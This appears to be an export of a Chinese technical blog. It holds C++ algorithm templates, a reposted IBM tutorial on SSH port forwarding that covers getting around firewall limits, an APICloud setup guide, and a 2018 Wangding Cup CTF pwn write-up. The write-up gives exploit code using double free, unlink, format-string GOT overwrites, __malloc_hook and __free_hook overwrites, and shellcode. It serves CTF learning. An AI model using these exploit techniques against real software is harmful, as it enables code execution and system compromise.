poly[i]; for (i = n - 1; i &gt;= 0; --i){ printf(&quot;%d&quot;, out[i]); i ? printf(&quot; &quot;) : printf(&quot;\\n&quot;); } } return 0;} Prim(EOJ 3199)123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 105;const int INF = 0x3f3f3f3f;int mp[maxn][maxn], dis[maxn], vis[maxn], n, sum;inline int prim(){ memset(vis, 0, sizeof vis); memset(dis, INF, sizeof dis); sum = dis[1] = 0; for (;;) { int u = -1, v, mincost = INF; for (int i = 1; i &lt;= n; ++i) if (dis[i] &lt; mincost &amp;&amp; !vis[i]) { mincost = dis[i]; u = i; } if (u == -1) break; vis[u] = 1; sum += dis[u]; for (v = 1; v &lt;= n; ++v) if (dis[v] &gt; mp[u][v]) dis[v] = mp[u][v]; } return sum;}int main(){ while (cin &gt;&gt; n) { memset(mp, INF, sizeof mp); for (int i = 1; i &lt;= n; ++i) for (int j = 1; j &lt;= n; ++j) scanf(&quot;%d&quot;, &amp;mp[i][j]); printf(&quot;%d\\n&quot;, prim()); } return 0;} Kruskal(EOJ 3201) n个点，m条边的图，要使得图中没有圈，求要去掉的边的权值和的最小值。 求图的最大生成树，用总权值减生成树权值得到答案。似乎是只能用kruskal做。边数组应该是要开到10000 * 10000 / 2的，没想到EOJ上提交RTE，改成10000 * 100就好了…… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;bits/stdc++.h&gt;using namespace std;#define maxn 11000struct edge{ int u, v; double w;}g[maxn*100];struct node{ double x, y;}point[maxn];double sum;int n, m, fa[maxn];inline double dis(const node&amp; a, const node&amp; b){ return sqrt((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y));}bool cmp(const edge&amp; a, const edge&amp; b){ return a.w &gt; b.w;}inline int find(int x){ return x == fa[x] ? x : fa[x] = find(fa[x]);}inline double kruskal(){ sort(g, g+m, cmp); double remain = 0.0; for (int i = 0; i &lt; m; ++i) { int x = find(g[i].u), y = find(g[i].v); if (x != y) { fa[x] = y; remain += g[i].w; }else continue; } return sum - remain;}int main(){ int u, v; cin &gt;&gt; n &gt;&gt; m; for (int i = 1; i &lt;= n; ++i) fa[i] = i; for (int i = 1; i &lt;= n; ++i) scanf(&quot;%lf%lf&quot;, &amp;point[i].x, &amp;point[i].y); for (int i = 0; i &lt; m; ++i) { scanf(&quot;%d%d&quot;, &amp;u, &amp;v); g[i].u = u; g[i].v = v; g[i].w = dis(point[u], point[v]); sum += g[i].w; } printf(&quot;%.6f\\n&quot;, kruskal()); return 0;} 判断线段是否与矩形相交 输入格式：xstart ystart xend yend xleft ytop xright ybottomNote: The terms top left and bottom right do not imply any ordering of coordinates. 计算几何题对我来说，光是写对就要花很久，而代码还要做到既简洁又易懂真是难上加难……注意点在于：线段与矩形不相交，这意味着线段不仅可以在矩形外，还可以在矩形内。 12345678910111213141516171819202122232425262728293031#include &lt;bits/stdc++.h&gt;using namespace std;int main(){ int t, x1, y1, x2, y2, xl, yt, xr, yb; int a, b, c, f1, f2, f3, f4; cin &gt;&gt; t; while (t--) { scanf(&quot;%d%d%d%d%d%d%d%d&quot;, &amp;x1, &amp;y1, &amp;x2, &amp;y2, &amp;xl, &amp;yt, &amp;xr, &amp;yb); if (xl &gt; xr) swap(xl, xr); if (yt &lt; yb) swap(yt, yb); a = y1 - y2; b = x2 - x1; c = x1 * y2 - y1 * x2; f1 = a * xl + b * yb + c; f2 = a * xl + b * yt + c; f3 = a * xr + b * yb + c; f4 = a * xr + b * yt + c; if ((f1&gt;0 &amp;&amp; f2&gt;0 &amp;&amp; f3&gt;0 &amp;&amp; f4&gt;0) || (f1&lt;0 &amp;&amp; f2&lt;0 &amp;&amp; f3&lt;0 &amp;&amp; f4&lt;0)) printf(&quot;F\\n&quot;); else if ((x1 &gt; xr &amp;&amp; x2 &gt; xr) || (x1 &lt; xl &amp;&amp; x2 &lt; xl)) printf(&quot;F\\n&quot;); else if ((y1 &gt; yt &amp;&amp; y2 &gt; yt) || (y1 &lt; yb &amp;&amp; y2 &lt; yb)) printf(&quot;F\\n&quot;); else printf(&quot;T\\n&quot;); } return 0;} KMP 对于一个给定的字符串 s，唐纳德给出 q 次询问，第 i 次询问包括三个参数 li,ri,zi，问在s[li…ri]的所有子串中共有多少个恰好为 zi。1≤|s|≤100, q≤∑|zi|≤100 坑点在于可重复。。比赛时用Python的切片水过去了，后来发现C++用string的substr和find方法也不难写，这里仅记录一下刚学的kmp解法。 说实话，kmp初学起来是有些绕，不过找点例子，耐心画几个图很快就能理解了。这个算法比较有趣的是求next数组时也是用的kmp，有种自洽的感觉。据说实际上，库函数strstr()和kmp效率差不多（甚至更快？）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1005;char s[maxn], t[maxn];int nxt[maxn];int q, l, r, len;inline void getnext(){ nxt[0] = -1; for (int i = 1, j = -1; i &lt; len; ++i) { while (j &gt; -1 &amp;&amp; t[j+1] != t[i]) j = nxt[j]; if (t[j+1] == t[i]) ++j; nxt[i] = j; }}inline int kmp(){ getnext(); int ans = 0; for (int i = l, j = -1; i &lt;= r; ++i) { while (j &gt; -1 &amp;&amp; t[j+1] != s[i]) j = nxt[j]; if (t[j+1] == s[i]) ++j; if (j == len-1) ++ans; } return ans;}int main(){ scanf(&quot;%s%d&quot;, s, &amp;q); while (q--) { scanf(&quot;%d%d %s&quot;, &amp;l, &amp;r, t); len = strlen(t); printf(&quot;%d\\n&quot;, kmp()); } return 0;} Graham求凸包(EOJ 1189) 给定平面上的n个点及半径r，求圆的周长与凸包周长之和。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;bits/stdc++.h&gt;using namespace std;const double PI = acos(-1.0);const int maxn = 1005;struct point {int x, y;}p[maxn];int s[maxn], top;inline int cross(point p0, point p1, point p2){ return (p1.x-p0.x) * (p2.y-p0.y) - (p1.y-p0.y) * (p2.x-p0.x);}inline double dis(point p1, point p2){ return sqrt((p2.x-p1.x)*(p2.x-p1.x) + (p2.y-p1.y)*(p2.y-p1.y));}inline bool cmp(point p1, point p2){ int c = cross(p[0], p1, p2); if (c &gt; 0) return 1; else if (!c &amp;&amp; dis(p[0], p1) &lt; dis(p[0], p2)) return 1; return 0;}inline void graham(int n){ s[0] = 0; if (n == 1) top = 0; else { s[1] = top = 1; if (n == 2) return; for (int i = 2; i &lt; n; ++i) { while (top &amp;&amp; cross(p[s[top-1]], p[s[top]], p[i]) &lt;= 0) --top; s[++top] = i; } }}int main(){ int n, r; double ans; while (cin &gt;&gt; n &gt;&gt; r) { scanf(&quot;%d%d&quot;, &amp;p[0].x, &amp;p[0].y); point p0; p0.x = p[0].x; p0.y = p[0].y; int k = 0; for (int i = 1; i &lt; n; ++i) { scanf(&quot;%d%d&quot;, &amp;p[i].x, &amp;p[i].y); if ((p0.y&gt;p[i].y) || ((p0.y==p[i].y)&amp;&amp;(p0.x&gt;p[i].x))) { p0.x = p[i].x; p0.y = p[i].y; k = i; } } p[k] = p[0]; p[0] = p0; sort(p+1, p+n, cmp); graham(n); ans = 2 * PI * r; for (int i = 0; i &lt;= top; ++i) ans += dis(p[s[i]], p[s[(i+1) % (top+1)]]); printf(&quot;%d\\n&quot;, (int)(ans+0.5)); } return 0;} 带路径还原的BFS 给定一个迷宫和起点终点，求最快要多少步到终点以及最快的路径，不能到达输出-1。 显然bfs，也因此需要开一个step数组记录步数，更新没有走过的点的step。路径还原则又需要一个数组记录这一步的上一个点，还原时从后往前递归输出即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 205;int n, m, sx, sy, ex, ey, ans;char mp[maxn][maxn];int step[maxn][maxn];const int dx[] = {1,-1,0,0};const int dy[] = {0,0,1,-1};struct node{ int x, y;}a[maxn][maxn];inline bool in(int x, int y){ return x&gt;=0 &amp;&amp; x&lt;n &amp;&amp; y&gt;=0 &amp;&amp; y&lt;n;}inline void bfs(){ queue&lt;node&gt; q; node u, v; int now = 0; u.x = sx; u.y = sy; q.push(u); while (!q.empty()) { u = q.front(); q.pop(); now = step[u.x][u.y]; for (int i = 0; i &lt; 4; ++i) { v.x = u.x+dx[i]; v.y = u.y+dy[i]; if (in(v.x, v.y) &amp;&amp; mp[v.x][v.y]=='.' || mp[v.x][v.y] == 'E') if (!step[v.x][v.y]) { a[v.x][v.y].x = u.x; a[v.x][v.y].y = u.y; step[v.x][v.y] = now+1; if (mp[v.x][v.y] == 'E') { ans = step[v.x][v.y]; return; } q.push(v); } } }}inline void dfs(int x, int y){ if (x!=sx || y!=sy) dfs(a[x][y].x, a[x][y].y); printf(&quot;%d %d\\n&quot;, x, y);}int main(){ cin &gt;&gt; n &gt;&gt; m; cin.get(); for (int i = 0; i &lt; n; ++i) { scanf(&quot;%s&quot;, mp[i]); for (int j = 0; j &lt; m; ++j) if (mp[i][j] == 'S') { sx = i; sy = j; }else if(mp[i][j] == 'E') { ex = i; ey = j; } } memset(step, 0, sizeof step); bfs(); if (ans) { printf(&quot;%d\\n&quot;, ans); dfs(ex, ey); }else printf(&quot;-1\\n&quot;); return 0;}","link":"/post/Templates/"},{"title":"【转载】实战 SSH 端口转发","text":"驾驭魔法，需要先掌握魔法的原理。 版权声明：本文转载自IBM Developer。纠正了原文中的一些笔误。 第一部分 概述当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！ 端口转发概述让我们先来了解一下端口转发的概念吧。我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。总的来说 SSH 端口转发能够提供两大功能： 加密 SSH Client 端至 SSH Server 端之间的通讯数据。 突破防火墙的限制完成一些之前无法建立的 TCP 连接。 图 1. SSH 端口转发 如上图所示，使用了端口转发之后，TCP 端口 A 与 B 之间现在并不直接通讯，而是转发到了 SSH 客户端及服务端来通讯，从而自动实现了数据加密并同时绕过了防火墙的限制。 第二部分 本地转发与远程转发本地转发实例分析我们先来看第一个例子，在实验室里有一台 LDAP 服务器LdapServerHost，但是限制了只有本机上部署的应用才能直接连接此 LDAP 服务器。如果我们由于调试或者测试的需要想临时从远程机器LdapClientHost直接连接到这个 LDAP 服务器 , 有什么方法能够实现呢？ 答案无疑是本地端口转发了，它的命令格式是： 1ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 在LdapClientHost上执行如下命令即可建立一个 SSH 的本地端口转发，例如： 1ssh -L 7001:localhost:389 LdapServerHost 图 2. 本地端口转发 这里需要注意的是本例中我们选择了 7001 端口作为本地的监听端口，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。 然后我们可以将远程机器LdapClientHost上的应用直接配置到本机的 7001 端口上（而不是 LDAP 服务器的 389 端口上）。之后的数据流将会是下面这个样子： 我们在LdapClientHost上的应用将数据发送到本机的 7001 端口上， 而本机的 SSH Client 会将 7001 端口收到的数据加密并转发到 LdapServertHost的 SSH Server 上。 SSH Server 会解密收到的数据并将之转发到监听的 LDAP 389 端口上， 最后再将从 LDAP 返回的数据原路返回以完成整个流程。 我们可以看到，这整个流程应用并没有直接连接 LDAP 服务器，而是连接到了本地的一个监听端口，但是 SSH 端口转发完成了剩下的所有事情，加密，转发，解密，通讯。 这里有几个地方需要注意： SSH 端口转发是通过 SSH 连接建立起来的，我们必须保持这个 SSH 连接以使端口转发保持生效。一旦关闭了此连接，相应的端口转发也会随之关闭。 我们只能在建立 SSH 连接的同时创建端口转发，而不能给一个已经存在的 SSH 连接增加端口转发。 你可能会疑惑上面命令中的&lt;remote host&gt;为什么用 localhost，它指向的是哪台机器呢？在本例中，它指向 LdapServertHost。我们为什么用localhost而不是 IP 地址或者主机名呢？其实这个取决于我们之前是如何限制 LDAP 只有本机才能访问。如果只允许loopback接口访问的话，那么自然就只有 localhost或者 IP 为127.0.0.1才能访问了，而不能用真实 IP 或者主机名。 命令中的&lt;remote host&gt;和&lt;SSH hostname&gt;必须是同一台机器么？其实是不一定的，它们可以是两台不同的机器。我们在后面的例子里会详细阐述这点。 好了，我们已经在LdapClientHost建立了端口转发，那么这个端口转发可以被其他机器使用么？比如能否新增加一台LdapClientHost2来直接连接LdapClientHost的 7001 端口？答案是不行的，在主流 SSH 实现中，本地端口转发绑定的是loopback接口，这意味着只有localhost或者127.0.0.1才能使用本机的端口转发 , 其他机器发起的连接只会得到connection refused.。好在 SSH 同时提供了GatewayPorts关键字，我们可以通过指定它与其他机器共享这个本地端口转发。 1ssh -g -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 远程转发实例分析我们来看第二个例子，这次假设由于网络或防火墙的原因我们不能用 SSH 直接从LdapClientHost连接到 LDAP 服务器LdapServertHost，但是反向连接却是被允许的。那此时我们的选择自然就是远程端口转发了。 它的命令格式是： 1ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 例如在 LDAP 服务器LdapServertHost端执行如下命令： 1ssh -R 7001:localhost:389 LdapClientHost 图 3. 远程端口转发 和本地端口转发相比，这次的图里，SSH Server 和 SSH Client 的位置对调了一下，但是数据流依然是一样的。我们在LdapClientHost上的应用将数据发送到本机的 7001 端口上，而本机的 SSH Server 会将 7001 端口收到的数据加密并转发到LdapServertHost的 SSH Client 上。 SSH Client 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，最后再将从 LDAP 返回的数据原路返回以完成整个流程。 看到这里，你是不是会有点糊涂了？为什么叫本地转发，而有时又叫远程转发？这两者有什么区别？ 本地转发与远程转发的对比与分析不错，SSH Server，SSH Client，LdapServertHost，LdapClientHost，本地转发，远程转发，这么多的名词的确容易让人糊涂。让我们来分析一下其中的结构吧。首先，SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。 我们可以回忆上面的两个例子来做个对照。 本地转发时： LdapClientHost同时是应用的客户端，也是 SSH Client，这两个连接都从它指向LdapServertHost（既是 LDAP 服务端，也是 SSH Server）。 远程转发时： LdapClientHost是应用的客户端，但却是 SSH Server ；而 LdapServertHost是 LDAP 的服务端，但却是 SSH Client 。这样两个连接的方向刚好相反。 另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接。 弄清楚了两者的区别之后，再来看看两者的相同之处。如果你所在的环境下，既允许LdapClientHost发起 SSH 连接到LdapServerHost，也允许LdapServerHost发起 SSH 连接到LdapClientHost。那么这时我们选择本地转发或远程转发都是可以的，能完成一样的功能。 接着让我们来看个进阶版的端口转发。我们之前涉及到的各种连接 / 转发都只涉及到了两台机器，还记得我们在本地转发中提到的一个问题么？本地转发命令中的&lt;remote host&gt;和&lt;SSH hostname&gt;可以是不同的机器么？ 1ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 答案是可以的！让我们来看一个涉及到四台机器 (A,B,C,D) 的例子。 图 4. 多主机转发应用 在 SSH Client(C) 执行下列命令来建立 SSH 连接以及端口转发： 1ssh -g -L 7001:&lt;B&gt;:389 &lt;D&gt; 然后在我们的应用客户端（A）上配置连接机器（C）的 7001 端口即可。注意我们在命令中指定了-g参数以保证机器（A）能够使用机器（C）建立的本地端口转发。而另一个值得注意的地方是，在上述连接中，（A）&lt;-&gt; (C) 以及 (B) &lt;-&gt; (D) 之间的连接并不是安全连接，它们之间没有经过 SSH 的加密及解密。如果他们之间的网络并不是值得信赖的网络连接，我们就需要谨慎使用这种连接方式了。 第三部分 其他类型的转发动态转发实例分析嗯，动态转发，听上去很酷。当你看到这里时，有没有想过我们已经讨论过了本地转发，远程转发，但是前提都是要求有一个固定的应用服务端的端口号，例如前面例子中的 LDAP 服务端的 389 端口。那如果没有这个端口号怎么办？等等，什么样的应用会没有这个端口号呢？嗯，比如说用浏览器进行 Web 浏览，比如说 MSN 等等。 当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览及 MSN 信息无疑是十分必要的。让我们先来看一下动态转发的命令格式： 1ssh -D &lt;local port&gt; &lt;SSH Server&gt; 例如： 1ssh -D 7001 &lt;SSH Server&gt; 图 5. 动态端口转发 似乎很简单，我们依然选择了 7001 作为本地的端口号，其实在这里 SSH 是创建了一个 SOCKS 代理服务。来看看帮助文档中对 -D 参数的描述： 123456789-D port This works by allocating a socket to listen to port on the local side, and whenever a connection is made to this port, the con- nection is forwarded over the secure channel, and the applica- tion protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server. Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file. 之后的使用就简单了，我们可以直接使用localhost:7001来作为正常的 SOCKS 代理来使用，直接在浏览器或 MSN 上设置即可。在 SSH Client 端无法访问的网站现在也都可以正常浏览。而这里需要值得注意的是，此时 SSH 所包护的范围只包括从浏览器端（SSH Client 端）到 SSH Server 端的连接，并不包含从 SSH Server 端 到目标网站的连接。如果后半截连接的安全不能得到充分的保证的话，这种方式仍不是合适的解决方案。 X 协议转发实例分析好了，让我们来看最后一个例子 - X 协议转发。 我们日常工作当中，可能会经常会远程登录到 Linux/Unix/Solaris/HP 等机器上去做一些开发或者维护，也经常需要以 GUI 方式运行一些程序，比如要求图形化界面来安装 DB2/WebSphere 等等。这时候通常有两种选择来实现：VNC 或者 X 窗口，让我们来看看后者。 使用 X 窗口通常需要分别安装：X Client 和 X Server 。在本例中我们的 X Client 就是所访问的远程 Linux/Unix/Solaris/HP，而我们的 X Server 则是发起访问的本地机器（例如你面前正在使用的笔记本或台式机）。把 X Client 端的 X 窗口显示在 X Server 端需要先行在 X Client 端指定 X Server 的位置，命令格式如下： 1export DISPLAY=&lt;X Server IP&gt;:&lt;display #&gt;.&lt;virtual #&gt; 例如： 1export DISPLAY=myDesktop:1.0 然后直接运行 X 应用即可，X 窗口就会自动在我们的本地端打开。 一切运行正常，但是，这时候 IT 部门突然在远程 Linux/Unix/Solaris/HP 前面加了一道防火墙。非常不幸的是，X 协议并不在允许通过的列表之内。怎么办？只能使用 VNC 了么？不，其实只要使用了 SSH 端口转发即可通过，同时也对 X 通讯数据做了加密，真是一举两得。（当然，使用此方法前最好先咨询相关 IT 部门是否符合相应的安全条例，以免造成违规操作。） 建立命令也很简单，直接从本地机器（X Server 端）发起一个如下的 SSH 连接即可： 1ssh -X &lt;SSH Server&gt; 图 6. X 转发 建立连接之后就可以直接运行远程的 X 应用。注意建立 X 转发之后会自动设置DISPLAY环境变量，通常会被设置成localhost:10.0，我们无需也不应该在连接之后再进行修改此环境变量。 一个比较常见的场景是，我们的本地机器是 Windows 操作系统，这时可以选择开源的 XMing 来作为我们的 XServer，而 SSH Client 则可以任意选择了，例如 PuTTY，Cygwin 均可以配置访问 SSH 的同时建立 X 转发。 第四部分 总结至此，我们已经完成了本地端口转发，远程端口转发，动态端口转发以及 X 转发的介绍。回顾起来，总的思路是通过将 TCP 连接转发到 SSH 通道上以解决数据加密以及突破防火墙的种种限制。对一些已知端口号的应用，例如 Telnet/LDAP/SMTP，我们可以使用本地端口转发或者远程端口转发来达到目的。动态端口转发则可以实现 SOCKS 代理从而加密以及突破防火墙对 Web 浏览的限制。对于 X 应用，无疑是 X 转发最为适用了。虽然每一部分我们都只是简单的介绍了一下，但如果能灵活应用这些技巧，相信对我们的日常生活 / 工作也是会有所帮助的。 相关主题 《SSH 权威指南》（O’Reilly 图书）详细介绍了 SSH 相关的更多技术内幕及相关技巧。 在developerWorks 中国网站 Linux 专区中学习更多 Linux 方面的知识。","link":"/post/SshTunnel/"},{"title":"VSCode+APICloud+GitHub 开发环境配置","text":"不是很懂为什么 APICloud 没有官方的 VSCode 插件。 在 APICloud 上进行开发时，有很多代码编辑器可以选择：APICloud Studio, Sublime Text, Atom, Eclipse 等等，对于这些工具，APICloud 都提供了官方的插件以方便开发与调试。然而，我最喜欢的编辑器 VSCode 却没有这样的待遇。好在这里提供了这样的插件，尽管它有诸多瑕疵。 插件配置按上述链接装好插件后，在 APICloud 云端创建一个 app，就能得到一个 ID，这个 ID 在部署 GitHub 时会用到。 在本地新建一个项目的目录，用 VSCode 的文件-&gt;打开文件夹命令打开这个目录。如果没有这一步，在后面新建项目时就会出错。 随后就可以Ctrl+Shift+P并输入apicloud，选择相应的命令了。例如可以新建一个项目模板，随后在目录下会出现一个新的目录 HelloAPICloud，包含了项目模板的所有文件。 Wifi 真机调试在进行真机调试前，首先需要做一些配置。这个插件最大的瑕疵就在这里。 文件-&gt;首选项-&gt;设置-&gt;扩展-&gt;APICloud中就能进行配置，首先是端口号，默认是 23456，可以不用改；后两个选项随意，最大的坑点在最后，一张图就能说明了： 因为我们后面要部署到 GitHub，所以我先把所有文件转移到了新建的 widget 目录，并删除了原来的 HelloAPICloud 目录。随后，当我在这一栏输入/widget并启动 wifi 全量更新时，控制台却提醒我当前目录不是一个有效的 APICloud 项目。这里显示的当前目录，并不是 widget 目录，而是它的上一级，也就是项目目录。 这就是说，我添加的这个路径没有被正确识别。为什么呢？看上图就明白了，Windows 下是使用\\而不是/来表示目录的（后者是 Linux 的习惯），而在这一字段的提示中，却分明写着： 放到根目录的’/widget’里 服了。 如上图一般配置后，先在右键菜单中启动 Wifi 服务。在此之前，手机上应已装好 AppLoader，并配置好端口号和 IP 地址。其中，端口号来自刚才的配置，默认是 23456；IP 地址的话在启动 Wifi 服务后的控制台里就可以看到。如果有多个 IP 地址，填以192.168开头的那个地址（或其它内网地址）。 这样以后再进行 Wifi 全量更新或 Wifi 增量更新，手机上闪过一段进度条后，就可以看到 app 的界面了。 关于这个插件的其它功能我还在研究中。 GitHub 部署新建个 repo。在本地的项目根目录下（和 widget 所在目录同目录）git init并关联到远程仓库，随后和常规 GitHub 仓库的操作一样了。 但是，我们还需要在widget/config.xml里，修改第二行的widget的id属性，改为刚才我们获得的 app 的 ID。并且，在 app 页面“端开发”的“代码”选项里，更改代码位置为“Git 平台”，填入代码地址、用户名和密码并保存，最后打开“启用 Git 平台”开关。这样，每次我们推送最新代码后就可以在 APICloud 上云编译了，尽管 APICloud 上无法看到你的最新推送。 希望这篇文章不要最后也变成“踩坑记”。","link":"/post/VSCode-APICloud/"},{"title":"网鼎杯2018 Pwn","text":"准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。 GUESS题目有三次猜flag机会，每次都会fork出子进程，并且开启了canary。尝试运行可以发现读取的flag放在了栈上，因此我们需要栈地址来泄露flag，而泄露栈地址需要先泄露libc。 首先我们可以覆盖argv[0]为puts@got，借助__stack_chk_fail函数的报错来泄露libc。输入任意字符串进入strncmp，在此处下断点，通过p &amp;__libc_argv[0]可得到argv[0]地址，然后查看栈得到我们输入的字符串所在地址，两个地址的距离就是我们需要栈溢出的长度，这个长度是0x128。然后放上puts@got就能泄露libc，接下来就能得到_environ地址。 计算_environ地址到flag地址的距离就能得到flag真实地址，这个距离是0x168，我们可以在第三次地址泄露中读到flag。 12345678910111213def ssp(payload): sla('flag', 'a'*0x128 + payload) ru('detected ***: ')ssp(p64(elf.got['puts']))puts = uu64(r(6))base,libc,system = leak_libc('puts',puts,libc)env = base + libc.sym['_environ']ssp(p64(env))flag = uu64(r(6)) - 0x168ssp(p64(flag)) blind本题存在double free但没有show功能，申请堆块时只能申请0x68大小的，这个大小我们喜闻乐见，因为申请到的实际堆块大小为0x70，而我们一般伪造chunk size都是借助0x7f来构造。 那么我们可以借助double free申请堆块到全局数组的位置，伪造的堆块可以在0x602060-0x23处找到，然后就可以在全局数组上方再伪造一个0x100大小的chunk，从而绕过0x68的限制申请到small chunk。这里我们将ptr[0]和ptr[2]写成0x602060，将ptr[4]写成0x602150，我们稍后会看到原因。 需要注意的是free时会检查后两块的chunk size是否合法，因此我们同样需要伪造：下一个chunk的起始地址为0x602050+0x100 = 0x602150，可以从这里开始伪造2个0x21的chunk。这里就是通过ptr[4]来伪造的。 然后我们释放0x100的伪造chunk，这样在释放时即进入unsorted bin，覆盖ptr[0]和ptr[1]为main_arena+88。释放需要用到一个指向0x602060的指针，也就是我们之前在ptr[0]写入的指针。随后进行partial overwrite，覆盖掉ptr[0]也就是main_arena+88的最低1字节为\\x00，这时ptr[0]存放的就是__malloc_hook-0x10的地址，这一步是编辑ptr[2]处指针指向的内容实现的。 此时再编辑ptr[0]指向的内容即可写__malloc_hook为后门函数。 12345678910111213141516171819202122add(0)add(1)free(0)free(1)free(0)fake = 0x602060fake_next = 0x602150add(2,p64(fake-0x23))add(3)add(4)payload = flat('a'*3,0,0x101,fake,0,fake,0,fake_next,0,0)add(5, payload)edit(4,flat(0,0x21,0,0,0,0x21))free(0) # 0x100edit(2,'') # \\x00, malloc_hook-0x10system = 0x4008e3edit(0,'a'*0x10+p64(system))sla(':',_add)sla(':',3) babyheap本题和上题有点类似，只能分配0x20的堆块，漏洞点相同，且多了show功能。 首先考虑泄露libc，我们采用传统的unsorted bin泄露大法，这就需要我们伪造small chunk。为了伪造这个chunk，首先要泄露堆地址，那么连续释放2个fast chunk，后一个的fd就会指向前一个chunk的地址，从而可以泄露堆地址。唯一需要注意的是show在输出时用的puts遇到\\x00会截断，所以要注意释放顺序使得泄露出的地址中不存在\\x00字节。 获得堆地址之后，在chunk0内伪造chunk头造成堆块重叠，然后申请两次就可以申请到一个heap+0x20处的chunk，通过写这个chunk我们可以写chunk1的头部，使得其大小变成0xa1。随后释放即可泄露libc，但这里释放时会检查后两个chunk的size，因此我们还需要绕过检查。 绕过的方法是，不断申请chunk直到0xa1这个chunk的末尾，此时申请到的是chunk4。写入0,0x31伪造一个chunk头；再申请一个chunk5，写入0x30,0x30伪造chunk头，使得chunk4看起来是空闲的。这两步先做好后再释放chunk1才能通过检查。 这里让chunk4空闲的目的就是为了触发unlink造成任意地址写，那么显然我们还需要再chunk4的内容里添加伪造的fd和bk，即0x602080-0x18和0x602080-0x10，这里0x602080是ptr[4]。unlink之后，我们成功令ptr[4]指向ptr[1]。现在编辑chunk4即可修改ptr[1]为free_hook，然后编辑chunk1即可覆盖free_hook为one_gadget（system同理）。 12345678910111213141516171819202122232425262728add(0)add(1)add(2)add(3)fd = 0x602080-0x18bk = 0x602080-0x10add(4,flat(0,0x31,fd,bk))add(5,flat(0x30,0x30))free(1)free(0)show(0)heap = uu64(r(4)) - 0x30leak('heap',heap)edit(0,flat(heap+0x20,0,0,0x31))add(6) # 0add(7,flat(0,0xa1)) # above 1free(1)show(1)base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10leak('base',base)free_hook = base + libc.sym['__free_hook']edit(4,p64(free_hook))edit(1,p64(base+0x4526a))free(2) easyfmt常规的32位格式化字符串题，自动化测得偏移为6，然后泄露libc，覆盖printf@got为system。 1234567891011121314ru('?\\n')def exec_fmt(payload): sl(payload) info = r() return infoauto = FmtStr(exec_fmt)sl(p32(elf.got['printf']) + '%6$s')r(4)printf = u32(r(4))leak('printf',printf)base,libc,system = leak_libc('printf',printf)sl(fmtstr_payload(auto.offset, {elf.got['printf']:system}))sl('/bin/sh\\x00') fgo入门级堆题，直接uaf即可。解法可以参考hitcontraining_hacknote。 1234567add(0x20)add(0x20)free(0)free(1)add(0x8,p32(elf.sym['secret']))show(0) soEasy存在栈溢出，给出了栈地址，checksec发现NX关闭，因此直接写好shellcode然后返回到shellcode地址即可。 1234ru('0x')buf = int(ru('\\n'),16)payload = asm(shellcraft.sh()).ljust(0x4c,'a') + p32(buf)sla('?',payload) pesp编辑时新的size并没有作检查，导致可以堆溢出。利用堆溢出修改空闲fast chunk的fd，手动造成uaf，借助假的0x7f伪造chunk分配到itemlist上方从而修改itemlist中的内容指针达到任意地址写，泄露libc后覆盖atoi为system。 1234567891011121314fake = 0x6020adadd(0x60)add(0x60)free(1)edit(0,0x100,flat('a'*0x60,0,0x71,fake))add(0x60) # 1add(0x60, flat('a'*3, 0x100, elf.got['atoi']))show()ru(': ')atoi = uu64(r(6))base,libc,system = leak_libc('atoi',atoi,libc)edit(0,0x8,p64(system))sla(':', '/bin/sh\\x00') semifinal_pwn1本题功能比较复杂，关键在于自己可以添加自己为好友，然后删除自己时就可以释放内存。而每个用户都会分配一块0x130的chunk，释放后进入unsorted bin。随后就可以利用uaf泄露libc并借助update功能覆盖got表。 